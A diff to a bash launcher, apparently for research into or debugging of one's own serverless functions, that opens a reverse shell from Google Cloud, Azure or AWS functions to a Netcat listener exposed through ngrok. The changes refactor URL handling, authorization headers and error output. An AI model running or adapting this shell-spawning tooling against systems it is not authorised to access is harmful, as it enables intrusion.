@@ -34,8 +34,8 @@ do
     key="$1"
 
     case $key in
-        -u|--url-id)
-        URL_ID="$2"
+        -u|--url)
+        URL="$2"
         shift 2
         ;;
 
@@ -46,11 +46,6 @@ do
 
         -p|--port)
         LISTENER_PORT="$2"
-        shift 2
-        ;;
-
-        -r|--region)
-        REGION="$2"
         shift 2
         ;;
 
@@ -77,9 +72,9 @@ done
 
 LISTENER_PORT="${LISTENER_PORT:-4444}"
 
-if [[ -z "$URL_ID" ]]
+if [[ -z "$URL" ]]
 then
-    echo 'usage: cheetah/cougar/panther [--url-id/-u PROJECT_ID/URL_ID] [--api-key/-a API_KEY] [--region/-r REGION_OVERRIDE] [--port/-p LISTENER_PORT_DEFAULT_4444] [--command/-c SINGLE_COMMAND_TO_RUN_ON_CONNECT] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
+    echo 'usage: cheetah/cougar/panther [--url/-u FUNCTION_URL] [--api-key/-a API_KEY] [--port/-p LISTENER_PORT_DEFAULT_4444] [--command/-c SINGLE_COMMAND_TO_RUN_ON_CONNECT] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]'
     echo 'See script/USAGE.md for more details.'
     exit 1
 fi
@@ -101,22 +96,26 @@ NGROK_PORT=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $2 }')
 if [[ -z $NGROK_HOST || -z $NGROK_PORT ]]
 then
     echo "Error: Failed to get host or port from ngrok."
+    echo "NGROK Output: $TMP_SUBDIR/ngrok_output.txt"
+    cat $TMP_SUBDIR/ngrok_output.txt
+    echo "NGROK Host: $NGROK_HOST_AND_PORT"
     exit 1
 fi
 
 case $MODE in
     cheetah)
-    REGION="${REGION:-us-central1}"
-    URL="https://$REGION-$URL_ID.cloudfunctions.net/Cheetah?host=$NGROK_HOST&port=$NGROK_PORT"
+    HEADER="Authorization: bearer $API_KEY"
+    URL="$URL?host=$NGROK_HOST&port=$NGROK_PORT"
     ;;
 
     cougar)
-    URL="https://$URL_ID.azurewebsites.net/api/Cougar?host=$NGROK_HOST&port=$NGROK_PORT&code=$API_KEY"
+    HEADER=""
+    URL="$URL?host=$NGROK_HOST&port=$NGROK_PORT&code=$API_KEY"
     ;;
 
     panther)
-    REGION="${REGION:-us-east-1}"
-    URL="https://$URL_ID.execute-api.$REGION.amazonaws.com/dev/api/Panther?host=$NGROK_HOST&port=$NGROK_PORT"
+    HEADER="X-API-Key: $API_KEY"
+    URL="$URL?host=$NGROK_HOST&port=$NGROK_PORT"
     ;;
 esac
 
@@ -133,7 +132,7 @@ do
     fi
 
     # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
-    curl -s "$URL" -H "X-API-Key: $API_KEY" > "$TMP_SUBDIR/curl_output.txt" &
+    curl -s -H "$HEADER" "$URL" > "$TMP_SUBDIR/curl_output.txt" &
 
     # Note: This might be an insufficient amount of time to wait for functions with cold starts.
     # TODO: Investigate better error checking methods.
